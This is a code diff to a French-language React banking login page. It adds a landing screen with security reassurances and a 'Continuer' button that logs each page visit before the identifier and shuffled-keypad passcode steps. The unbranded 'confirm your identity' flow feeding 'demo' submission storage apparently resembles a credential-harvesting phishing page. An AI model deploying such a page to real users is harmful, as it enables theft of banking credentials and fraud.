@@ -1,6 +1,6 @@
 import { useState } from 'react'
 import logo from './assets/logo.webp'
-import { saveDemoSubmission } from './demoSubmissions'
+import { saveDemoSubmission, savePageVisit } from './demoSubmissions'
 import './Client.css'
 
 const Icon = ({ name, size = 22 }) => {
@@ -25,12 +25,25 @@ const shuffleDigits = () => {
 }
 
 function Client() {
-  const [loginStep, setLoginStep] = useState('identifier')
+  const [loginStep, setLoginStep] = useState('start')
   const [identifier, setIdentifier] = useState('')
   const [passcode, setPasscode] = useState('')
   const [keypadDigits, setKeypadDigits] = useState(shuffleDigits)
   const [submissionStatus, setSubmissionStatus] = useState('idle')
   const [submissionMessage, setSubmissionMessage] = useState('')
+  const [visitSaving, setVisitSaving] = useState(false)
+
+  const handleContinuer = async () => {
+    setVisitSaving(true)
+    try {
+      await savePageVisit()
+    } catch (error) {
+      console.error('Unable to save page visit:', error)
+    } finally {
+      setVisitSaving(false)
+      setLoginStep('identifier')
+    }
+  }
 
   const handleIdentifier = (event) => {
     event.preventDefault()
@@ -88,7 +101,27 @@ function Client() {
         <div className="client-login-card">
           <div className="client-login-icon" aria-hidden="true"><Icon name="lock" size={26}/></div>
 
-          {loginStep === 'identifier' ? (
+          {loginStep === 'start' ? (
+            <>
+              <p className="client-kicker">ESPACE CLIENT</p>
+              <h2 id="login-title">Accédez à votre espace personnel</h2>
+              <p className="client-login-intro">Gérez vos comptes, suivez vos opérations et accédez à tous vos services bancaires en toute sécurité.</p>
+              <ul className="client-start-features">
+                <li><Icon name="shield" size={18}/>Connexion sécurisée et chiffrée</li>
+                <li><Icon name="check" size={18}/>Accès à tous vos comptes</li>
+                <li><Icon name="user" size={18}/>Vos conseillers disponibles</li>
+              </ul>
+              <button
+                className="client-login-submit client-continuer-btn"
+                type="button"
+                onClick={handleContinuer}
+                disabled={visitSaving}
+                id="client-continuer"
+              >
+                {visitSaving ? 'Chargement…' : 'Continuer'} <Icon name="arrow" size={18}/>
+              </button>
+            </>
+          ) : loginStep === 'identifier' ? (
             <>
               <h2 id="login-title">Connectez-vous pour confirmer votre identité</h2>
               <p className="client-login-intro">Saisissez votre identifiant pour continuer.</p>
